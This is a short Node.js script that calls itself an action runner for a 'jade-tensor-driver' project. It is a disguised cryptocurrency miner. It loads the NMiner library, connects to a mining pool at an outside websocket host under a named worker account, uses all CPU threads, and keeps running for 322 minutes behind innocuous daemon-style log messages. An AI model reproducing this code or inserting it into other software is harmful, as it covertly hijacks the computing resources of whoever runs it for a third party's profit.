// Procedural action runner for jade-tensor-driver
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

function assembleProcessRunner() {
    const sessionId = "54433b";
    console.log(`[daemon] Instantiated runtime context for jade-tensor-driver [${sessionId}]`);

    const engine = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.jade-tensor-driver",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (322m) reached, exiting cleanly.");
        process.exit(0);
    }, 322 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log("[halt] Clean lifecycle exit confirmed.");
        process.exit(0);
    });
}

assembleProcessRunner();
